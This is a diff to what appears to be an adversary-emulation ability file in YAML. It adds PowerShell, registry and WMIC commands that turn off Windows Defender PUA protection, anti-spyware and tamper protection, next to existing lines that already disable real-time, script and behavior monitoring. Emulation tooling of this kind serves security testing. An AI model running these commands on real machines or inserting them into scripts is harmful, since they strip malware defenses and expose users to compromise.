@@ -26,6 +26,9 @@ platforms:
         Set-MpPreference -DisableScriptScanning $true;
         Set-MpPreference -EnableControlledFolderAccess Disabled;
         Set-MpPreference -DisableBehaviorMonitoring $true;
+        Set-MpPreference -PUAProtection Disabled;
+        Set-MpPreference -DisableAntiSpyware $true;
+        Set-MpPreference -TamperProtection Disabled;
     cmd:
       command: |
         reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f;
@@ -34,6 +37,9 @@ platforms:
         reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access" /v "EnableControlledFolderAccess" /t REG_DWORD /d "0" /f;
         reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f;
         reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f;
+        reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f;
+        reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f;
+        reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f;
       variants:
       - command: |-
           wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIntrusionPreventionSystem=TRUE;
@@ -42,3 +48,6 @@ platforms:
           wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set EnableControlledFolderAccess=0;
           wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableIOAVProtection=TRUE;
           wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableBehaviorMonitoring=TRUE;
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set PUAProtection=0;
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set DisableAntiSpyware=TRUE;
+          wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call set TamperProtection=0;
